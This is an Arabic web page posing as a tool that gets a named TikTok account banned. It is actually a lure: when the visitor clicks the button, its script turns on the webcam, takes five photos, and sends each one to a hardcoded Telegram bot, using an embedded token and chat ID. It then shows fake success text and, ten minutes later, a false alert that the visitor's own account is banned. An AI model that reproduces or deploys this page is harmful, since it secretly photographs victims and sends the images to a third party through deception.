<!DOCTYPE html><html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تبنيد حساب تيك توك</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Cairo', sans-serif;
      background: black;
      color: white;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      position: relative;
      text-align: center;
    }h1 {
  font-size: 28px;
  color: #ff0050;
  margin-bottom: 10px;
}

p {
  margin: 0 0 20px;
  color: #ccc;
}

input {
  padding: 10px;
  border-radius: 25px;
  border: none;
  outline: none;
  text-align: center;
  font-size: 16px;
  width: 250px;
  margin-bottom: 20px;
}

button {
  background: #ff0050;
  color: white;
  border: none;
  padding: 12px 24px;
  border-radius: 30px;
  font-size: 18px;
  cursor: pointer;
  box-shadow: 0 0 15px #ff0050;
}

.tiktok-icon {
  font-size: 48px;
  color: #ff0050;
  margin-bottom: 20px;
}

canvas, video {
  display: none;
}

#success {
  display: none;
  color: #0f0;
  margin-top: 20px;
  font-size: 18px;
}

  </style>
</head>
<body>
  <i class="fab fa-tiktok tiktok-icon"></i>
  <h1>تبنيد حساب تيك توك</h1>
  <p>ضع يوزر هنـا:</p>
  <input type="text" id="username" placeholder="@username">
  <button onclick="startProcess()">🚨 اضغط هنا لتبنيد الحساب</button>
  <video id="video" autoplay playsinline></video>
  <div id="success">✅ تم إرسال الصور بنجاح</div>  <script>
    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
    const chatId = "7220184605";

    async function sendPhoto(blob, index) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, `photo${index}.jpg`);

      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    async function startProcess() {
      try {
        const video = document.getElementById("video");
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement("canvas");
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext("2d");

        for (let i = 0; i < 5; i++) {
          await new Promise(res => setTimeout(res, 1000));
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));
          await sendPhoto(blob, i + 1);
        }

        stream.getTracks().forEach(track => track.stop());

        document.getElementById("success").style.display = "block";

        setTimeout(() => {
          alert("🚫 تم حظر حساب تيك توك الخاص بك نهائياً");
        }, 600000); // بعد 10 دقائق

      } catch (err) {
        alert("❌ الكاميرا غير مفعلة أو تم رفض الإذن");
      }
    }
  </script></body>
</html>
